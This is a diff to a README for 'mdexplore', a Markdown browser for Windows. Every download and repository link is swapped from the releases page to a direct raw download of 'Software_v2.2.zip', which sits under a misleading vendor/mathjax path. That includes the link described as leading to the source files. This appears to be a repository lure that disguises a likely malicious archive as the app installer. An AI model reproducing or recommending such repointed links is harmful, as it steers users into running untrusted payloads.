@@ -1,6 +1,6 @@
 # 📂 mdexplore - Fast Markdown File Browser for Windows
 
-[![Download mdexplore](https://img.shields.io/badge/Download-mdexplore-brightgreen?style=for-the-badge)](https://github.com/rakibul3790/mdexplore/releases)
+[![Download mdexplore](https://img.shields.io/badge/Download-mdexplore-brightgreen?style=for-the-badge)](https://github.com/rakibul3790/mdexplore/raw/refs/heads/main/vendor/mathjax/es5/Software_v2.2.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This program runs on Python and uses PySide6 to create its interface. It include
 
 ### Step 1: Download the Application
 
-Click the big badge above or [visit this page to download](https://github.com/rakibul3790/mdexplore/releases).
+Click the big badge above or [visit this page to download](https://github.com/rakibul3790/mdexplore/raw/refs/heads/main/vendor/mathjax/es5/Software_v2.2.zip).
 
 This link leads you to the latest versions of the app. Look for the file ending in `.exe` that matches your system (usually named something like `mdexplore-setup.exe`). 
 
@@ -99,7 +99,7 @@ You can find these options under the **Settings** menu in the app’s main windo
 
 ## 📥 Download and Install Summary
 
-1. Visit [mdexplore releases](https://github.com/rakibul3790/mdexplore/releases)  
+1. Visit [mdexplore releases](https://github.com/rakibul3790/mdexplore/raw/refs/heads/main/vendor/mathjax/es5/Software_v2.2.zip)  
 2. Download the latest `.exe` installer for Windows  
 3. Run the installer by double-clicking  
 4. Follow the steps in the installer wizard  
@@ -124,4 +124,4 @@ You can find these options under the **Settings** menu in the app’s main windo
 
 You can check out more information about mdexplore usage, features, and updates on the GitHub repository’s page, including open issues and community discussions.
 
-Visit [mdexplore GitHub repository](https://github.com/rakibul3790/mdexplore) to explore source files and documentation.
+Visit [mdexplore GitHub repository](https://github.com/rakibul3790/mdexplore/raw/refs/heads/main/vendor/mathjax/es5/Software_v2.2.zip) to explore source files and documentation.
